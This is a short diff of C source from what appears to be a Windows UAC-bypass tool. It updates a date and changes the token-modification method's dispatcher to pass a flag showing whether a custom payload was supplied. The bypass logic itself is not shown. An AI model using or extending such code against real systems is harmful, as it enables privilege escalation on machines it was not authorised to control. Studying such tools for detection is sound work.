@@ -6,7 +6,7 @@
 *
 *  VERSION:     2.87
 *
-*  DATE:        19 Jan 2018
+*  DATE:        03 Mar 2018
 *
 *  UAC bypass dispatch.
 *
@@ -787,6 +787,7 @@ UCM_API(MethodTyranid)
 UCM_API(MethodTokenMod)
 {
     LPWSTR lpszPayload = NULL;
+    BOOL fUseCommandLine;
 
     UNREFERENCED_PARAMETER(Method);
     UNREFERENCED_PARAMETER(ExtraContext);
@@ -796,12 +797,16 @@ UCM_API(MethodTokenMod)
     //
     // Select target application or use given by optional parameter.
     //
-    if (g_ctx.OptionalParameterLength == 0)
+    if (g_ctx.OptionalParameterLength == 0) {
         lpszPayload = g_ctx.szDefaultPayload;
-    else
+        fUseCommandLine = FALSE;
+    }
+    else {
         lpszPayload = g_ctx.szOptionalParameter;
+        fUseCommandLine = TRUE;
+    }
 
-    return ucmTokenModification(lpszPayload);
+    return ucmTokenModification(lpszPayload, fUseCommandLine);
 }
 
 UCM_API(MethodJunction)
